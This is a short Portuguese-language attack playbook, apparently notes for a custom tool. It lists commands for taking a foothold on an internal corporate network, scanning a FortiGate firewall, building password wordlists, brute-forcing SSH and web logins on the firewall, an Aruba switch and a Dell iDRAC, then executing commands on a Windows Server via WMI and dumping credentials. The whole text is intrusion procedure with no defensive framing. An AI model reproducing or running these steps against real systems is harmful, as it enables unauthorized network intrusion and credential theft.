1. Posicionamento (dentro da rede):
   ipmanager  add:192.168.10.77/24     # vira um "host da empresa" na faixa
   ipmanager  list                     # confere

2. Mapear o FortiGate:
   fwprobe     192.168.10.1
   discovery   192.168.10.0/24
   portscan    192.168.10.1:22,443,10443,445,3389

3. Wordlist sob medida:
   wordlist  gen:8|14|lower,digit|corp_adm     # média 8-14 chars, letras+dígitos
   wordlist  gen:6|8|lower,digit,special|srv
   wordlist  list / get:corp_adm / del:corp_adm / delall

4. Brute:
   devicebrute   192.168.10.1|ssh|admin|corp_adm       # FortiGate SSH
   brutetiming   https://192.168.10.1|/login|username|password|admin|corp_adm   # web UI FortiGate
   devicebrute   192.168.20.5|ssh|admin|corp_adm       # switch Aruba
   devicebrute   192.168.30.10|ssh|root|srv            # Dell (iDRAC/SSH)

5. Windows Server achado:
   exec     192.168.30.20|DOMINIO\admin|senha|whoami /all|wmi
   intel    192.168.30.20
   creds    dump   (no host onde você tem shell)